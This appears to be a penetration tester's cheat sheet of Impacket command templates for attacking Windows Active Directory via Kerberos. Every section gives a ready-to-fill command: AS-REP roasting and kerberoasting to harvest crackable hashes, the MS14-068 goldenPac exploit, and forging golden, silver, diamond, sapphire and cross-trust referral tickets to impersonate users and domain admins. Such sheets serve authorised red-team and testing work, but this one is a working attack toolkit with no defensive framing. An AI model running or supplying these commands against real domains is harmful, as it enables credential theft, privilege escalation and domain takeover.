# Impacket

% impacket, windows, kerberos, 88

## GetNPUsers without password to get TGT (ASREPRoasting)
#plateform/linux #target/remote #cat/ATTACK/EXPLOIT 
```
impacket-GetNPUsers <DOMAIN>/<USER> -no-pass -request -format hashcat
```

## GetNPUsers - attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ (ASREPRoasting)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
impacket-GetNPUsers -dc-ip <DC-IP> <DOMAIN>/ -usersfile <users_file> -format hashcat
```

## GetNPUsers - authenticated with Hash ‘Do not require Kerberos preauthentication’ (ASREPRoasting)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
impacket-GetNPUsers -request -format hashcat -hashes '<HASH>' -dc-ip <DC-IP> '<DOMAIN>/<USER>'
```

## GetNPUsers - authenticated with password ‘Do not require Kerberos preauthentication’ (ASREPRoasting)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
impacket-GetNPUsers -request -format hashcat -dc-ip <DC-IP> '<DOMAIN>/<USER>:<PASSWORD>'
```

## GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
impacket-GetUserSPNs -dc-ip <DC-IP> '<DOMAIN>/<USER>:<PASSWORD>'
```

## GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
impacket-GetUserSPNs -hashes '<HASH>' -dc-ip <DC-IP> '<DOMAIN>/<USER>'
```

## MS14-068 - goldenPac
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
impacket-goldenPac -dc-ip <DC-IP> <DOMAIN>/'<USER>':'<PASSWORD>'@<target>
```

## Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
impacket-ticketer -nthash <nthash> -domain-sid <domain-sid> -domain <DOMAIN> <randomuser>
```

## Ticketer - (golden ticket) - with an AES 128/256bits key
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
impacket-ticketer -aesKey '<krbtgtAESkey>' -domain-sid '<domainSID>' -domain '<DOMAIN>' '<randomuser>'
```

## Ticketer - (golden ticket) - with an RC4 key, i.e. NT hash with custom user/groups ids
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
impacket-ticketer -nthash '<krbtgtNThash>' -domain-sid '<domainSID>' -domain '<DOMAIN>' -user-id '<USER-ID>' -groups '<GROUPS-ID>' '<randomuser>'
```

## Ticketer - Generate golden ticket with extra SID

```
impacket-ticketer -nthash '<hash>' -domain-sid '<domain-sid>' -domain '<domain-FQDN>' -extra-sid '<target_domain_SID-RID>' '<someusername>'
```

# Trust - forge the referral ticket
```
impacket-ticketer -nthash '<hash>' -domain-sid '<domain-sid>' -domain '<domain-FQDN>' -extra-sid '<target_domain_SID-RID>' -spn 'krbtgt/<domain-FQDN>' 'someusername'
```


## Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
impacket-ticketer -nthash <hash> -domain-sid <domain-sid> -domain <DOMAIN> -spn <SPN> <USER>
```

## Ticketer - (silver ticket) - with an AES (128 or 256 bits) key
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
impacket-ticketer -aesKey '<AESkey>' -domain-sid '<DomainSID>' -domain '<DOMAIN>' -spn '<SPN>' '<username>'
```

## TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
#plateform/linux #target/local  #cat/UTILS
```
impacket-ticketConverter <ccache_ticket_file> <ticket_kirbi_file>
```

## Silver ticket - impersonate user
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
impacket-getST -spn cifs/<target> <DOMAIN>/<netbios_name>\$ -impersonate <USER>
```

## GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey
#plateform/linux #target/remote  #cat/UTILS
```
impacket-getTGT -dc-ip <DC-IP> -hashes <hash> <DOMAIN>/<USER>
```

## GetADUser - gather data about the domain’s users and their corresponding email addresses
#plateform/linux #target/remote  #cat/RECON 
```
impacket-GetADUsers -all <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC-IP>
```

## Diamond tickets - Forge Diamond tickets
#plateform/linux #target/remote  #cat/RECON 
```
impacket-ticketer -request -domain '<DOMAIN>' -user '<USER>' -password '<PASSWORD>' -nthash 'krbtgt/<HASH>' -aesKey 'krbtgt/<AES_KEY>' -domain-sid '<DOMAIN-SID>' -user-id '<ID>' -groups '<GROUPS-ID>' '<randomuser>'
```

## Sapphire tickets - Forge Sapphire tickets
#plateform/linux #target/remote  #cat/RECON 
```
impacket-ticketer -request -impersonate '<DOMAIN-ADMIN>' -domain '<DOMAIN.FQDN>' -user '<domain_user>' -password '<PASSWORD>' -nthash 'KRBTGT-HASH>' -aesKey 'KRBTGT-AES-KEY>' -user-id '<ID>' -domain-sid '<DOMAIN-SID>' '<randomuser>'
```